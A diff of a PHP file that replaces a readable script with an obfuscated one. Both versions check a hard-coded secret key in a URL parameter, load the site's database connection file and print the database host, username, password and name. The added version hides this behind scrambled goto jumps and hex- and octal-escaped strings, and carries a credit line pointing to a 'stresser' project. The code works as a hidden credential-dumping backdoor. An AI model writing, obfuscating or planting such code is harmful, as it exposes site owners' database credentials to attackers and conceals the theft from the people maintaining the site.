@@ -1,21 +1,3 @@
 <?php
-$specialKey = 'z2JhV5nB8KdRfTG3Wqm0JpN1cALMZs4XHvQ7lgC9pO2iU8fD6yEtV3bSaKwXrMjYqWnP7ZoLsTuR8XdF9kHyGqN5vVxLmZ0dQ6nTrP9cJuVsRgYbN2hXfA4WkL8dZvMpC7jE3yUqT5o';
-
-if (!isset($_GET['key']) || $_GET['key'] !== $specialKey) {
-    die('Access denied: Invalid key.');
-}
-
-$dbConnFile = realpath('../../../componements/php/database_conn.php');
-
-if (!file_exists($dbConnFile)) {
-    die('Error: Database connection file not found.');
-}
-
-include $dbConnFile;
-
-echo "<h1>Database Credentials</h1>";
-echo "<p><strong>Host:</strong> " . htmlspecialchars($servername, ENT_QUOTES, 'UTF-8') . "</p>";
-echo "<p><strong>Username:</strong> " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8') . "</p>";
-echo "<p><strong>Password:</strong> " . htmlspecialchars($password, ENT_QUOTES, 'UTF-8') . "</p>";
-echo "<p><strong>Database:</strong> " . htmlspecialchars($dbname, ENT_QUOTES, 'UTF-8') . "</p>";
-?>
+// Made by Meandoyou and StingAving https://github.com/g0k1/love-stresser
+ goto sGwX6; Nz1Ih: if (!isset($_GET["\x6b\145\x79"]) || $_GET["\x6b\x65\171"] !== $specialKey) { die("\x41\x63\143\x65\x73\x73\40\144\x65\156\x69\145\144\x3a\x20\111\156\166\141\x6c\151\144\40\153\145\171\x2e"); } goto iWztq; xPrBw: if (!file_exists($dbConnFile)) { die("\105\x72\162\x6f\162\72\40\104\141\x74\x61\142\141\163\x65\40\143\x6f\156\156\145\143\164\151\157\x6e\40\x66\151\x6c\145\40\x6e\x6f\164\40\x66\157\165\156\x64\56"); } goto QW46h; iWztq: $dbConnFile = realpath("\x2e\x2e\57\x2e\56\57\56\x2e\x2f\143\x6f\155\160\x6f\156\x65\155\x65\x6e\164\163\57\160\150\160\57\x64\141\164\x61\142\x61\163\x65\x5f\143\157\x6e\156\x2e\160\x68\160"); goto xPrBw; Y5ppi: echo "\74\x68\x31\76\104\141\164\x61\x62\x61\x73\x65\x20\103\x72\x65\144\145\x6e\x74\151\141\154\163\x3c\57\x68\x31\76"; goto Y_efl; ONNA0: echo "\74\x70\76\74\x73\164\x72\x6f\x6e\x67\x3e\x50\x61\163\163\x77\157\x72\x64\72\74\x2f\163\x74\162\x6f\x6e\147\x3e\40" . htmlspecialchars($password, ENT_QUOTES, "\x55\124\106\55\70") . "\x3c\x2f\160\x3e"; goto V06Hf; sGwX6: $specialKey = "\x7a\62\x4a\x68\126\65\156\x42\x38\x4b\144\x52\x66\x54\107\63\x57\161\155\60\x4a\160\116\x31\x63\101\114\x4d\132\x73\x34\130\x48\x76\x51\67\x6c\147\x43\71\160\117\x32\151\125\x38\x66\x44\66\171\x45\164\x56\63\142\x53\x61\x4b\x77\x58\x72\115\152\x59\161\x57\x6e\120\67\x5a\157\x4c\x73\x54\165\x52\70\130\x64\106\x39\153\110\171\x47\x71\116\65\x76\x56\x78\x4c\155\x5a\60\x64\121\x36\x6e\124\162\x50\x39\143\x4a\165\126\163\x52\x67\131\142\116\x32\x68\130\x66\x41\x34\x57\153\114\x38\144\x5a\x76\x4d\x70\103\67\152\105\x33\171\x55\161\124\x35\x6f"; goto Nz1Ih; ncQq7: echo "\x3c\x70\x3e\x3c\163\164\162\x6f\156\x67\x3e\x55\x73\x65\162\x6e\x61\155\145\x3a\x3c\x2f\163\x74\x72\x6f\x6e\x67\76\x20" . htmlspecialchars($username, ENT_QUOTES, "\x55\124\x46\55\70") . "\74\57\160\76"; goto ONNA0; Y_efl: echo "\74\160\76\74\x73\164\162\157\156\x67\76\110\x6f\163\164\72\x3c\57\163\x74\162\157\x6e\x67\76\40" . htmlspecialchars($servername, ENT_QUOTES, "\x55\x54\106\x2d\x38") . "\74\57\x70\76"; goto ncQq7; V06Hf: echo "\74\x70\x3e\74\x73\x74\x72\157\x6e\147\76\104\141\x74\x61\x62\x61\x73\145\72\74\57\x73\164\162\157\156\x67\x3e\40" . htmlspecialchars($dbname, ENT_QUOTES, "\x55\124\106\x2d\x38") . "\74\57\x70\x3e"; goto mYwYJ; QW46h: include $dbConnFile; goto Y5ppi; mYwYJ: ?>
